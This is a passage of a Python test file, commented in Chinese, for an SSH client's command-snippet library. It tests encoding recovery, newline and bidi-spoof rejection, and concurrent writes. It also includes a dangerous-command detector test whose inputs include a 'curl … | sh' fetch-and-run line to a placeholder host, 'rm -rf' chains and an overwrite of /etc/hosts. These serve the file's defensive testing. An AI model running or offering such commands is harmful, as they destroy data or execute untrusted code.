        pan12.filter_edit.setFocus()
        settle(app, 200)
        if not _focus_is(app, pan12.filter_edit, "点进搜索框之后焦点过去"):
            # **直接退出这一组**，不要往下走。焦点没落上去的时候，下面每一次
            # keyClick 拿到的都是 None，每一个都会把整个进程打死 —— 那样输出里
            # 只会剩一句 Qt 的 assert，看不出真正坏的是哪一条。
            print("       （焦点没落上去，本组剩下的按键判据没法评，跳过）")
            pan12.close()
            host.close()
            return
        pan12.list.setCurrentRow(0)
        settle(app, 80)
        # **拿"实际选中的那条"当期望值，不要拿 store12.items[0]。**
        # 这两者只有在列表顺序恰好等于 store 顺序时才相等，而中间隔着
        # `search()` + `reload()` 重建列表。实测有 4/20 轮对不上：发出去的是
        # 第二条（free -h）而期望是第一条。断言的是"选中的那条被原样发出去"，
        # 这才是这一组真正要量的东西；顺手把"确实选中了"也变成显式前提。
        sel = pan12.current()
        check("列表确实选中了第 0 条（否则下面量的是另一条）",
              sel is not None and pan12.list.currentRow() == 0,
              "currentRow=%s current_id=%r items[0]=%r"
              % (pan12.list.currentRow(), pan12.current_id(),
                 store12.items[0].id if store12.items else None))
        if sel is None:
            pan12.close()
            host.close()
            return
        want = sel.command.encode("utf-8")
        sent12.clear()
        ch12.sent.clear()
        if _focus_key(app, QtCore.Qt.Key.Key_Return, "搜索框里按回车",
                      expect=pan12.filter_edit):
            settle(app, 80)
            check("搜索框里回车 = 插入选中的那条",
                  sent12 == [want], "sent=%r 期望=%r currentRow=%s current_id=%r"
                  % (sent12, want, pan12.list.currentRow(), pan12.current_id()))
            check("同一个回车**没有漏给远端**（终端没焦点就不该收到）",
                  ch12.sent == [], str(ch12.sent))
            check("搜索框里回车同样**不带 \\r**", all(b"\r" not in s for s in sent12))
            check("搜索框里的回车没有顺手触发「添加」",
                  pan12.title_edit.text() == "" and pan12.cmd_edit.text() == "")

        # Esc：先清搜索词，再关窗；而且这一刻不能有字节漏给远端
        sent12.clear()
        ch12.sent.clear()
        pan12.filter_edit.setText("df")
        settle(app, 50)
        if not _require_focus(app, pan12.filter_edit, "搜索框里的 Esc 两段式"):
            pan12.filter_edit.clear()
        else:
            if _focus_key(app, QtCore.Qt.Key.Key_Escape, "搜索框有内容时按 Esc",
                          expect=pan12.filter_edit):
                settle(app, 80)
                check("Esc 先清空搜索词而不是立刻关窗",
                      pan12.filter_edit.text() == "", repr(pan12.filter_edit.text()))
                check("**Esc 一个字节都没漏给远端**（否则用户的 vim 会莫名其妙退出）",
                      sent12 == [] and ch12.sent == [], str(sent12 + ch12.sent))
            else:
                pan12.filter_edit.clear()
            if not _require_focus(app, pan12.filter_edit, "搜索词已空时再按 Esc"):
                pan12.close()
            elif _focus_key(app, QtCore.Qt.Key.Key_Escape, "搜索词已空时按 Esc",
                            expect=pan12.filter_edit):
                settle(app, 80)
                check("搜索词已空时再按 Esc 才关窗", not pan12.isVisible())

        # 上下键在搜索框里切换选中，而不是变成远端的历史键
        pan12.show()
        pan12.activateWindow()
        settle(app, 200)
        if not _require_focus(app, pan12.filter_edit, "搜索框里按下键切选中"):
            pass
        else:
            pan12.list.setCurrentRow(0)
            ch12.sent.clear()
            if _focus_key(app, QtCore.Qt.Key.Key_Down, "搜索框里按下键",
                          expect=pan12.filter_edit):
                settle(app, 80)
                check("搜索框里按下键是切选中，不是发给远端",
                      ch12.sent == [], str(ch12.sent))
                check("选中确实往下移了", pan12.list.currentRow() == 1,
                      str(pan12.list.currentRow()))

    if QtWidgets.QApplication.platformName() in ("offscreen", "minimal"):
        print("  [跳过] 焦点组：当前平台 %s 没有真正的窗口系统，"
              "focusWidget() 测不出东西（不是通过了，是没测）"
              % QtWidgets.QApplication.platformName())
        check("焦点组被明确跳过而不是悄悄通过", True)
        check("对照组：字节层面那几条仍然成立（它们不依赖焦点）",
              pan12 is not None)
        SKIPPED.append("焦点组（平台 %s 无真正的窗口系统）"
                     % QtWidgets.QApplication.platformName())
    else:
        _focus_checks()
    pan12.close()
    host.close()

    group_13_15(app)

    for g in (group_16, group_17, group_18, group_19, group_20, group_21,
              group_22, group_23, group_24, group_25, group_26, group_27,
              group_28, group_29, group_30, group_31, group_32):
        g(app)
    return _summary()


# ---------------------------------------------------------------------------
# 16-21：复审挖出来的六组，每一条都曾经是**完全没有测试**的行为
# ---------------------------------------------------------------------------


def group_16(app):
    print("\n[16] 非 UTF-8 的文件不能让应用起不来（这条曾经是真崩溃）")
    # 复审实测：load() 只 except OSError，而 UnicodeDecodeError 是
    # **ValueError** 的子类，直接穿透 __init__ 冒到 MainWindow.__init__，
    # 而那里没有 try —— 一个用 PowerShell 5.1 的 Out-File 写出来的
    # UTF-16 snippets.json 就足以让整个应用无法启动。模块 docstring 点名
    # 「PowerShell 5.1 的 Out-File」并因此用了 utf-8-sig，**只防了 BOM，
    # 没防编码**。
    # 关键不是「用哪个编码写」，而是「字节在 UTF-8 下是否非法」。
    # 只放 GBK / UTF-16 这类整体换编码的还不够：ASCII 文本在任何单字节
    # 编码下都是**合法 UTF-8**，那种情况本来就该正常读出来。所以额外补一个
    # 裸的高位字节 —— latin-1/cp1252 能编，UTF-8 编不了，那才是真触发点。
    for label, blob in (
            ("utf-16LE（PowerShell 5.1 Out-File 默认）",
             '[{"title":"中文","command":"echo 中文"}]'.encode("utf-16")),
            ("GBK", '[{"title":"中文","command":"echo 中文"}]'.encode("gbk")),
            ("裸高位字节（latin-1 能编、UTF-8 编不了）",
             b'[{"title":"\x80\x81","command":"echo \xa0"}]'),
            ("截断的多字节序列", "中文".encode()[:-1]),
    ):
        p = tmpdir() / "s.json"
        p.write_bytes(blob)
        try:
            st = SnippetStore(p)
            check("%s 的文件退回内置集而不是抛" % label,
                  st.loaded_ok is False and len(st.items) == len(default_snippets()),
                  "loaded_ok=%s" % st.loaded_ok)
        except Exception as exc:
            check("%s 的文件退回内置集而不是抛" % label, False,
                  "抛了 %s: %s（这会让应用起不来）" % (type(exc).__name__, exc))

    # 对照组：纯 ASCII 在任何单字节编码下都该**正常**读出来，不是见编码就退
    ok_p = tmpdir() / "s.json"
    ok_p.write_bytes(b'[{"title":"ok","command":"df -h"}]')
    check("对照组：合法 UTF-8 不该被当成坏文件",
          SnippetStore(ok_p).loaded_ok is True)

    # 整条启动路径也不许抛：MainWindow 缺省就会建 SnippetStore
    from sshclient.core import settings as _settings
    from sshclient.ui import main_window as _mw

    st16 = _settings.AppSettings()
    st16.save = lambda: None
    try:
        win = _mw.MainWindow(st16, _settings.SessionStore(
            pathlib.Path(tempfile.mkdtemp()) / "s.json"),
            snippet_store=None if False else SnippetStore(tmpdir() / "s.json"))
        check("MainWindow 构造不抛", True)
        win.deleteLater()
        QtCore.QCoreApplication.sendPostedEvents(
            None, QtCore.QEvent.Type.DeferredDelete)
    except Exception as exc:
        check("MainWindow 构造不抛", False,
              "%s: %s" % (type(exc).__name__, exc))


def group_17(app):
    print("\n[17] 坏文件要隔离，不能等下次 save 覆盖")
    # 上一版只是「构造时没覆盖」，用户下一次 add/remove 就把可抢救的原文件
    # 盖掉了 —— 那还是永久丢失。正确做法是改名隔离：原字节还在，用户能自己
    # 捞回来，而新文件能从内置集干净地重建。
    d = tmpdir()
    p = d / "s.json"
    original = b"{ this is not json"
    p.write_bytes(original)
    st = SnippetStore(p)
    check("读不出来时 loaded_ok 为 False", st.loaded_ok is False)
    bad = sorted(d.glob("s.json.bad-*"))      # 同一个目录，别再新起一个 tmpdir()
    check("坏文件被改名留下来了（不是删掉，也不是留在原地）",
          len(bad) == 1 and bad[0].read_bytes() == original,
          "找到 %d 个: %s" % (len(bad), [b.name for b in bad]))
    st.add("用户新加的", "echo hi")
    check("加完之后新文件是干净的", p.exists() and p.read_text(encoding="utf-8")
          .lstrip().startswith("["))
    check("加完之后坏文件还在（用户救得回来）", bad[0].exists())
    st2 = SnippetStore(p)
    check("重新读得到用户新加的那条",
          any(s.title == "用户新加的" for s in st2.items))
    check("重新读 loaded_ok 为 True", st2.loaded_ok is True)

    # 编码坏掉的同样隔离
    p2 = tmpdir() / "s.json"
    p2.write_bytes('[{"title":"x"}]'.encode("utf-16"))
    SnippetStore(p2)
    check("编码坏掉的文件也隔离", len(list(p2.parent.glob("s.json.bad-*"))) == 1)


def group_18(app):
    print("\n[18] 命令里的换行必须拒收（只插入、不执行的兜底）")
    # 这一条曾经被测试**钉成正确行为**：原 [10] 里写着「命令里本来就有换行
    # 时如实发出（不吞不改）」。而插入是逐字节原样发出去的，命令里一个 \\n
    # 就等于客户端替用户按了回车，把后半截执行掉 —— 与这个功能唯一不可
    # 让步的承诺正面冲突。
    st = SnippetStore(tmpdir() / "s.json")
    for bad_cmd in ("echo one\recho two", "echo one\necho two",
                    "echo one\r\necho two", "a\x0bb", "a b",
                    "a b"):
        check("拒收带换行的命令 %r" % bad_cmd,
              st.add("x", bad_cmd) is None)
    check("一条都没被加进去（不是只挡了部分）",
          not any("echo one" in s.command for s in st.items),
          str([s.command for s in st.items if "echo" in s.command]))
    check("正常命令照常能加", st.add("正常", "df -h") is not None)
    check("update 也一样拒收", st.update(
        st.items[-1].id, "改名", "a\nb") is False)
    check("update 被拒之后内容没变（没被半途改掉）",
          st.items[-1].command == "df -h", st.items[-1].command)
    # 首尾的空白/换行**应该**被 strip 掉 —— 危险的是命令**中间**的换行。
    # 这两种别混为一谈：把首尾换行也当拒收，会让「粘贴时带了个尾换行」
    # 这种最常见的情况变成"加不进去"。
    check("首尾带换行/空白时照常能加（strip 掉即可）",
          st.add("带尾换行", "  \n df -h \n ") is not None)
    stored = next(s for s in st.items if s.title == "带尾换行")
    check("存下来的是 strip 干净的版本（里面没有换行）",
          stored.command == "df -h", repr(stored.command))
    check("落盘的那条同样没有换行",
          not any("\n" in s.command for s in SnippetStore(st.path).items))

    # 肉眼看不见、但会在发给远端的字节里、
    # 还能骗过眼睛的字符。最毒的是 U+202E（RTL override）：
    # 它让后面的字符按 RTL 渲染，于是
    # `rm -rf /tmp/x` 可以在界面上显示成完全不同的样子。
    #
    # **用 chr() 显式构造，不要写字面量。** 源码里直接写 U+200B /
    # U+200D 这类字符会被编辑器、格式化、复制粘贴悄悄
    # 规范化掉 —— 我第一版就是这么写的，结果九个
    # 用例里有五个的判据里根本**没有那个字符**，断言恒真。
    invisible = [("RLO U+202E（右到左覆盖）", 0x202E),
                 ("LRO U+202D", 0x202D), ("LRE U+202A", 0x202A),
                 ("零宽空格 U+200B", 0x200B),
                 ("零宽连接符 U+200D", 0x200D),
                 ("LRM U+200E", 0x200E), ("bidi isolate U+2066", 0x2066),
                 ("ZWNBSP U+FEFF", 0xFEFF), ("soft hyphen U+00AD", 0x00AD)]
    for label, cp in invisible:
        ch = chr(cp)
        check("判据里真的有那个字符（防字面量被规范化掉）",
              snippets._has_invisible("x" + ch) is True, "U+%04X" % cp)
        check("拒收命令里的 %s" % label,
              st.add("骗人的", "rm -rf /tmp/x" + ch + "ls") is None)
        check("拒收标题里的 %s（列表上显示的就是它）" % label,
              st.add("骗人的" + ch, "df -h") is None)
    check("一条都没被加进去",
          not any("rm -rf" in s.command for s in st.items),
          str([s.command for s in st.items if "rm -rf" in s.command]))
    check("普通中文照常能加（别把正常的中文也拦了）",
          st.add("中文标题", "echo 你好，世界") is not None)
    check("带 emoji 的命令照常能加",
          st.add("带图", "echo 🎉") is not None)

    # 磁盘上已有的脏数据也不能带进来
    p = tmpdir() / "s.json"
    p.write_text(json.dumps([
        {"id": "a", "title": "有换行", "command": "echo x\necho y"},
        {"id": "rlo", "title": "有 RLO", "command": "rm" + chr(0x202E) + "x"},
        {"id": "rtlo", "title": "标题有 RLO" + chr(0x202E) + "x",
         "command": "ls"},
        {"id": "b", "title": "正常", "command": "df -h"},
    ], ensure_ascii=False), encoding="utf-8")
    st2 = SnippetStore(p)
    check("磁盘上带换行的记录被丢掉",
          not any("\n" in s.command for s in st2.items),
          str([s.command for s in st2.items]))
    check("磁盘上命令带 RLO 的记录被丢掉",
          not any(chr(0x202E) in s.command for s in st2.items),
          str([repr(s.command) for s in st2.items]))
    check("磁盘上标题带 RLO 的记录被丢掉（显示欺骗的入口是列表）",
          not any(chr(0x202E) in s.title for s in st2.items),
          str([repr(s.title) for s in st2.items]))
    check("同一文件里正常的记录还在",
          any(s.title == "正常" for s in st2.items))
    check("有脏记录时 loaded_ok 为 False（界面上要提示）",
          st2.loaded_ok is False)


def group_19(app):
    print("\n[19] 危险命令自检的覆盖面（第一版 16 种里漏了 12 种）")
    # 第一版只 lstrip 开头的 |&; 、只把 > 当独立 token，于是这些全部放行。
    saved = snippets.BUILTIN_SNIPPETS
    dangerous = {
        "分号串联": "ls; rm -rf /var/tmp/x",
        "管道串联": "ls | rm -rf /var/tmp/x",
        "命令替换": "echo $(rm -rf /var/tmp/x)",
        "反引号": "echo `rm -rf /var/tmp/x`",
        "无空格重定向": "echo x >/etc/hosts",
        "追加重定向": "echo x >>/etc/hosts",
        "find -delete": "find /var/tmp -name '*.log' -delete",
        "find -exec": "find /var/tmp -name x -exec rm {} ;",
        "curl 管道执行": "curl -s http://example.invalid/i.sh | sh",
        "eval": "eval 'rm -rf /var/tmp/x'",
        "git clean": "git clean -fdx",
        "绝对路径 rm": "/bin/rm -rf /var/tmp/x",
        "chmod 777": "chmod 777 /var/tmp",
    }
    try:
        for label, cmd in dangerous.items():
            snippets.BUILTIN_SNIPPETS = saved + ((label, cmd, "危险"),)
            caught = snippets.audit_builtins()
            check("自检抓到：%s" % label, len(caught) >= 1,
                  "放行了 %r" % cmd)
    finally:
        snippets.BUILTIN_SNIPPETS = saved
    check("拿掉之后重新是干净的", snippets.audit_builtins() == [],
          str(snippets.audit_builtins()))
    # 正常命令不能被误伤
    try:
        for label, cmd in (("管道读", "ps aux | head -n 15"),
                           ("含 > 的比较", "test -gt 3"),
                           ("有横杠的参数", "journalctl -n 100 --no-pager")):
            snippets.BUILTIN_SNIPPETS = saved + ((label, cmd, "正常"),)
            check("正常命令不被误伤：%s" % label,
                  snippets.audit_builtins() == [],
                  str(snippets.audit_builtins()))
    finally:
        snippets.BUILTIN_SNIPPETS = saved


def group_20(app):
    print("\n[20] 内置 id 由内容派生，重复 id 会合并")
    from sshclient.core.snippets import builtin_id

    check("同样的内容永远得到同样的 id",
          builtin_id("A", "df -h") == builtin_id("A", "df -h"))
    check("内容不同 id 就不同",
          builtin_id("A", "df -h") != builtin_id("B", "df -h"))
    # 第一版按序号派生：重排内置表会让 b-00 换主人，用户磁盘上的 id 集体
    # 改嫁，restore_builtins 于是永远补不回来。
    base = [s.id for s in default_snippets()]
    shuffled = list(reversed(snippets.BUILTIN_SNIPPETS))
    reordered = [snippets.Snippet(id=builtin_id(t, c), title=t, command=c)
                 for t, c, _h in shuffled]
    check("重排内置表之后 id 集合不变",
          sorted(s.id for s in reordered) == sorted(base),
          "%s vs %s" % (sorted(s.id for s in reordered)[:2], sorted(base)[:2]))

    # 重复 id：remove 一次会删两条，用户点一下少一格却不止一格
    p = tmpdir() / "s.json"
    p.write_text(json.dumps([
        {"id": "dup", "title": "第一条", "command": "echo 1"},
        {"id": "dup", "title": "第二条", "command": "echo 2"},
    ], ensure_ascii=False), encoding="utf-8")
    st = SnippetStore(p)
    check("重复 id 被合并成一条", len([s for s in st.items if s.id == "dup"]) == 1,
          str([(s.id, s.title) for s in st.items if s.id == "dup"]))
    check("有重复时 loaded_ok 为 False（界面上要提示）", st.loaded_ok is False)
    before = len(st.items)
    st.remove("dup")
    check("删一次只少一条", len(st.items) == before - 1,
          "%d -> %d" % (before, len(st.items)))


def _writer_main(path, n, rounds, marker):
    """独立进程里的写者。

    必须是**模块级**函数：Windows 的 spawn 要 pickle 目标，局部函数
    pickle 不了（踩过一次：PicklingError: Can't pickle local object）。

    写一个 JSON 计数文件，让父进程能证明两件事：**它真的跑过**，以及
    **它真的存成功过**。之前只有个 "done" 标记，于是父进程只能证明子进程
    启动成功 —— 而在 Windows 上并发 ``os.replace`` 撞占用多表现为
    ``save()`` 静默 False，如果三个进程一次都没存成功，父进程读的那个文件
    从头到尾没人改过，"并发写期间读者没读到损坏的文件"就是**恒真**的。
    （之前那个 3 参数的旧版 ``_writer_main`` 是重复死函数，被下面这个
    覆盖掉了，已删。）
    """
    import time as _t

    from sshclient.core.snippets import SnippetStore as _Store
    big = "echo " + ("x" * 200000)
    ok, failed = 0, 0
    for i in range(rounds):
        st = _Store(pathlib.Path(path))
        st.add("w%d-%d" % (n, i), big)
        if st.last_save_ok:
            ok += 1
        else:
            failed += 1
        _t.sleep(0.002)
    pathlib.Path(marker).write_text(
        json.dumps({"ok": ok, "failed": failed, "rounds": rounds}),
        encoding="utf-8")


def group_21(app):
    print("\n[21] 并发写不会发布损坏的文件（原子写只对崩溃成立）")
    # 第一版的临时文件名固定成 snippets.json.tmp：两个进程各写各的，
    # 读者会在 replace 之前读到别人写到一半的内容。
    #
    # 用**真正的独立进程**（subprocess，而不是线程）：用户开两个
    # MavisSSH 就是两个进程，而同进程的两个 store 永远是顺序写的，
    # 结构上就测不到这个竞态 —— 原来的 [9] 就是这么写的，
    # 它证明不了任何事。
    import subprocess
    import threading

    d = tmpdir()
    p = d / "s.json"
    p.write_text("[]", encoding="utf-8")
    bad_reads, reads, writes = [], [0], [0]
    stop_evt = threading.Event()

    def reader():
        while not stop_evt.is_set():
            try:
                txt = p.read_text(encoding="utf-8-sig")
            except (OSError, ValueError):
                continue          # 原子 replace 的瞬间路径短暂不存在，正常
            reads[0] += 1
            try:
                json.loads(txt)
            except ValueError as exc:
                bad_reads.append(str(exc))

    rd = threading.Thread(target=reader, daemon=True)
    rd.start()
    # **注入 tests/ 而不是仓库根**：之前插了仓库根，而
    # _snippets 在 tests/ 下，子进程 import 失败、直接死在启动阶段。
    tests_dir = os.path.join(ROOT, "tests")
    markers = [os.path.join(d, "w%d.done" % n) for n in range(3)]
    # 完成标记从 argv 取，不能写死在脚本里 —— 写死的话只有 0 号进程会写，
    # 而那正是「只验一个进程」这种假绿的温床。
    script = ("import sys; sys.path.insert(0, %r);"
              "import _snippets as t; t._writer_main(%r, int(sys.argv[1]), 15, sys.argv[2])"
              % (tests_dir, str(p)))
    procs = []
    for n in range(3):
        procs.append(subprocess.Popen(
            [sys.executable, "-c", script, str(n), markers[n]],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT))
    outs = []
    for pr in procs:
        try:
            outs.append(pr.communicate(timeout=60)[0].decode("utf-8", "replace"))
        except subprocess.TimeoutExpired:
            pr.kill()
            outs.append("<timeout>")

    # 第一个关卡：子进程**真的跑过**、**真的存成功过**了吗。
    # 不断言子进程的存盘次数就是一个空转的测试：它回录的那个
    # 读者测的文件可能从头到尾没人改过。
    ok_saves = 0
    for n, (pr, out) in enumerate(zip(procs, outs)):
        check("子进程 %d 退出码为 0（**它真的跑过**）" % n,
              pr.returncode == 0, "rc=%s 输出=%s" % (pr.returncode, out[:300]))
        check("子进程 %d 写完了计数文件" % n,
              os.path.exists(markers[n]), "没写完成标记")
        payload = {}
        if os.path.exists(markers[n]):
            try:
                payload = json.loads(
                    pathlib.Path(markers[n]).read_text(encoding="utf-8"))
            except ValueError:
                payload = {}
        ok_saves += int(payload.get("ok", 0))
        check("子进程 %d 至少存成功过一次（%d 成功 / %d 被占用挡下）" % (
            n, payload.get("ok", -1), payload.get("failed", -1)),
            int(payload.get("ok", 0)) >= 1, str(payload))
    # 阈值定 5：实测三个进程加起来的成功次数在 9~15 之间波动（剩下的是被
    # 文件占用挡下的），这条要证明的是"并发写确实发生了很多次"，不是数得准。
    # 定 10 的话本身就会变成一个新的偶发红。
    check("并发写确实发生了（成功次数够多，否则下面那条在 Windows 上是恒真的）",
          ok_saves >= 5, "三个进程加起来只成功了 %d 次" % ok_saves)
    check("有到读取发生（防恒真）", reads[0] > 10,
          "只读了 %d 次" % reads[0])

    stop_evt.set()
    rd.join(3)
    # 这一条在 Windows 上偏弱（并发 os.replace 碰占用多表现为 save 静默
    # False，而不是读者读到坏文件），所以上面那条"成功次数够多"就是它的
    # **前提**：没有真的并发写成功过，这条断言等于什么都没量。
    check("并发写期间读者没读到损坏的文件（已发生 %d 次成功写）" % ok_saves,
          not bad_reads, "撞到 %d 次（读了 %d 次）：%s"
          % (len(bad_reads), reads[0], bad_reads[:2]))
    leftovers = list(d.glob("*.tmp"))
    check("没有临时文件残骸", not leftovers,
          str([f.name for f in leftovers]))
    # 结束时文件仍然是一个完好的 JSON
    final = SnippetStore(p)
    check("并发写之后文件仍然完好",
          all("\n" not in s.command for s in final.items),
          "loaded_ok=%s" % final.loaded_ok)



def group_22(app):
    print("\n[22] 闸门起点：远端已发出、本地还没起的那半秒也必须禁插")
    # 复审实测：`busy` 只在 begin() 那一刻才锁，但下载方向上按下按钮之后
    # `sz` 命令**已经发出**了，本地 `rz` 还要等 500ms（_begin_zmodem_download）。
    # 那半秒里 busy=False、按钮使能、_insert_snippet 返回 True，插进去的字节
    # 被 sz/rz 当载荷吃掉。**判据必须比 busy 宽。**
    from sshclient.core import settings as _settings
    from sshclient.ui import main_window as _mw

    st22 = _settings.AppSettings()
    st22.save = lambda: None
    store22 = SnippetStore(tmpdir() / "s.json")

    class _Ch:
        closed = False

        def __init__(self):
            self.sent = []

        def sendall(self, data):
            self.sent.append(data)

    # **必须留住 win 的引用。** MainWindow 是临时构造又没存变量的话，
    # 下一行就被 GC 回收，Qt 连带把子标签页的 C++ 对象也析构了 ——
    # 之后碰 tab.terminal 报 "wrapped C/C++ object has been deleted"。
    # 这个坑和「deleteLater 不会真的析构」正好是一对。
    win = _mw.MainWindow(
        st22, _settings.SessionStore(pathlib.Path(tempfile.mkdtemp()) / "s.json"),
        snippet_store=store22)
    tab = _mw.SessionTab(win)
    # 插入走的是 terminal._send -> terminal._channel，所以假通道要**绑在
    # terminal 上**；只设 tab._channel 的话字节发到空气里，断言"送出去了"
    # 会假失败。
    tab._channel = _Ch()
    tab.terminal.bind_channel(tab._channel, manage_notifier=False)
    check("空闲时判据是空的（就是能插）",
          tab._channel_block_reason() == "", repr(tab._channel_block_reason()))
    check("空闲时能插", tab._insert_snippet(b"df -h") is True)
    check("空闲时字节真的送出去了", tab._channel.sent == [b"df -h"],
          str(tab._channel.sent))

    # 复现那条半秒窗口：sz 已发出，本地引擎还没起
    tab._channel.sent.clear()
    tab._zmodem_pending_direction = "download"
    check("**sz 已在等、本地还没起时判据不为空**",
          tab._channel_block_reason() != "", "判据是空的，闸门起点太晚")
    check("那半秒里插不进去", tab._insert_snippet(b"df -h") is False)
    check("那半秒里通道一个字节都没被写",
          tab._channel.sent == [], str(tab._channel.sent))

    # 面板的按钮状态也必须跟着变（不是只有插入这条路挡着）
    pan22 = _mw.SnippetPanel(store22, tab._insert_snippet,
                             ctrl=tab.transfer_ctrl,
                             block_reason=tab._channel_block_reason,
                             parent=tab)
    # 生产里 _toggle_snippets 会把引用挂上去，_sync_snippet_gate 才有地方
    # 发通知。这里照做——不挂的话"清掉待办之后按钮恢复"那条会假失败，
    # 而真 bug（通知发不出去）会被这条假失败盖住。
    tab._snippet_panel = pan22
    pan22.show()
    app.processEvents()
    pan22.list.setCurrentRow(0)
    check("面板按钮在那半秒里是禁用的（不是只有插入这条路挡着）",
          not pan22.insert_btn.isEnabled())
    pan22._on_insert()
    check("双击列表也插不进去",
          tab._channel.sent == [], str(tab._channel.sent))
    check("提示说清了为什么", "rz/sz" in pan22.hint.text(), pan22.hint.text())

    # 忙时闸门也是同一个判据
    class _Eng:
        def start(self): pass

        def request_cancel(self): pass

    tab.transfer_ctrl.begin("upload", "上传", _Eng(), 1)
    check("闸门本身也拦得住", tab._channel_block_reason() != "")
    check("忙时按钮禁着", not pan22.insert_btn.isEnabled())
    tab.transfer_ctrl.succeed("")

    # 清掉待办之后要恢复
    tab._zmodem_pending_direction = None
    app.processEvents()
    check("待办清掉之后判据恢复为空",
          tab._channel_block_reason() == "", repr(tab._channel_block_reason()))
    check("恢复之后按钮重新使能", pan22.insert_btn.isEnabled())
    check("恢复之后又能插了", tab._insert_snippet(b"df -h") is True)
    pan22.close()
    tab._snippet_panel = None

    # ---- 生产路径 ----
    # 评审实跑：把 main_window 里那两行 `_zmodem_pending_direction = "download"`
    # / `= "upload"` 删掉，上面那些断言**一条都不红** —— 因为整组测试全程
    # 手工赋属性，从来没走过真正的用户路径。补上。
    def _prod_check(tag: str, trigger) -> None:
        ch2 = _Ch()
        ch2.sent.clear()
        tab.terminal.bind_channel(ch2, manage_notifier=False)
        tab._channel = ch2
        tab._zmodem_pump = None
        tab.transfer_ctrl.reset("用例隔离")
        tab._reset_zmodem_state()
        trigger()
        app.processEvents()
        check("%s 之后通道确实已经归了远端（sz/rz 已发出）" % tag,
              len(ch2.sent) > 0, "通道一个字节都没写：%r" % (ch2.sent,))
        check("%s 之后判据不是空的（闸门起点真的接上了）" % tag,
              tab._channel_block_reason() != "",
              "判据是空的：%s 这行被删掉了吗" % tag)
        check("%s 之后终端输入锁上了" % tag,
              tab.terminal._input_blocked is True)
        ch2.sent.clear()
        tab.terminal._send(b"df -h")
        check("%s 之后按键进不去" % tag, ch2.sent == [], str(ch2.sent))
        # 收尾
        tab._zmodem_pending_direction = None
        tab._zmodem_pump = None
        tab._reset_zmodem_state()
        tab.transfer_ctrl.reset("用例收尾")
        app.processEvents()
        check("%s 收尾之后判据恢复" % tag,
              tab._channel_block_reason() == "",
              repr(tab._channel_block_reason()))
        # **必须把 _on_download 排的那个 500ms 定时器排掉。** 否则它会在后面
        # 某一组里触发，而那时这个 tab 可能已经被 GC 掉了 —— 表现是整个
        # 测试进程 abort，**连 traceback 都没有**（PyQt6 里槽/回调拿到野对象
        # 就是 0xC0000409）。踩过一次：整个 [26] 组一句输出都没有就死了。
        settle(app, 700)

    def _do_download():
        # **必须把 `msgbox.ask_dir` 替掉 —— 这条以前是漏的。**
        # `_on_download`（`main_window.py:1199`）在确认远端路径存在之后会
        # **无条件**弹一个「选择下载保存目录」的模态框。判据进程里没有人能
        # 点它，于是 `exec()` 一直等，整个 `_snippets.py` 挂到 180 秒超时，
        # 报告只写一句 TIMEOUT —— 一个字都看不出是哪儿卡住的。
        #
        # 为什么不是每次都卡：走在这之前的 `check_remote_paths` 有时会把路径
        # 判成不存在，从 `msgbox.warning` 那条早退（那个框有替身）。
        # **卡不卡取决于走到哪条分支，于是表现成间歇性挂死**，比必现更难查。
        #
        # 挂 `msgbox.ask_dir` 而不是 `QFileDialog.getExistingDirectory`，理由
        # 和下面上传那条一样：生产代码走的是 `msgbox`，挂错地方等于没测过。
        from sshclient.ui import msgbox as _mb
        real_dialog = _mb.ask_dir
        reached = {"n": 0}

        def _fake(*a, **k):
            reached["n"] += 1
            return str(tmpdir())

        tab.sz_target_edit.setText("/tmp/a.txt")
        _mb.ask_dir = _fake
        try:
            tab._on_download()
        finally:
            _mb.ask_dir = real_dialog
        check("元断言：下载的目录框替身确实被调到了", reached["n"] >= 1,
              "被调 %d 次 —— 挂错地方的话这条下面全是在替一条没走过的路径背书"
              % reached["n"])

    _prod_check("点了下载", _do_download)

    # 上传路径：_on_upload 会弹文件选择框，这里直接替掉那一段。
    # 替身挂在 `msgbox.open_files` 上而不是 `QFileDialog.getOpenFileNames`——
    # 生产代码不再调那个静态方法了，挂错地方的话上传路径等于没被测过。
    def _do_upload():
        from sshclient.ui import msgbox as _mb
        real_dialog = _mb.open_files
        reached = {"n": 0}

        def _fake(*a, **k):
            reached["n"] += 1
            return ([str(d / "u.txt")], "")

        d = tmpdir()
        (d / "u.txt").write_text("x", encoding="utf-8")
        _mb.open_files = _fake
        try:
            tab._on_upload()
        finally:
            _mb.open_files = real_dialog
        # 元断言：替身真的被调到了（挂错地方的话这里就是 0，而下面那条
        # "上传流程走完了"会因为压根没选文件而靠别的东西蒙混过去）
        check("元断言：上传的文件框替身确实被调到了", reached["n"] == 1,
              "被调 %d 次" % reached["n"])

    _prod_check("点了上传", _do_upload)

    # 生产路径上 _toggle_snippets 必须真的把引用挂上，否则上面那个通知
    # 在真 app 里发不出去（这就是"记得在某处连一下"的反面）。
    tab2 = _mw.SessionTab(win2 := _mw.MainWindow(
        st22, _settings.SessionStore(pathlib.Path(tempfile.mkdtemp()) / "s.json"),
        snippet_store=SnippetStore(tmpdir() / "s.json")))
    check("还没开过面板时引用是空的", tab2._snippet_panel is None)
    tab2._toggle_snippets()
    check("_toggle_snippets 之后引用挂上了（通知发得出去）",
          tab2._snippet_panel is not None)
    tab2._zmodem_pending_direction = "download"
    check("待办一来，面板立刻禁插（生产路径）",
          not tab2._snippet_panel.insert_btn.isEnabled())
    tab2._zmodem_pending_direction = None
    check("待办清掉，面板立刻恢复（生产路径）",
          tab2._snippet_panel.insert_btn.isEnabled())
    tab2._on_disconnect()
    app.processEvents()


def group_23(app):
    print("\n[23] 片段库是整个进程一份，不是一个窗口一份")
    # 每 MainWindow 一份的话，同时开两个窗口时 w1 刚加的片段会被 w2 的
    # add() 静默覆盖：磁盘上只剩 w2 那份，而 w1 内存里还以为自己有。
    from sshclient.core import settings as _settings
    from sshclient.ui import main_window as _mw

    saved = _mw._APP_SNIPPET_STORE
    try:
        _mw._APP_SNIPPET_STORE = SnippetStore(tmpdir() / "s.json")
        st23 = _settings.AppSettings()
        st23.save = lambda: None
        w1 = _mw.MainWindow(st23, _settings.SessionStore(
            pathlib.Path(tempfile.mkdtemp()) / "s.json"))
        w2 = _mw.MainWindow(st23, _settings.SessionStore(
            pathlib.Path(tempfile.mkdtemp()) / "s.json"))
        check("两个窗口拿到的是同一份", w1.snippet_store is w2.snippet_store)
        check("id 也相同", id(w1.snippet_store) == id(w2.snippet_store))
        w1.snippet_store.add("w1 加的", "echo w1")
        check("w1 加的 w2 立刻看得到",
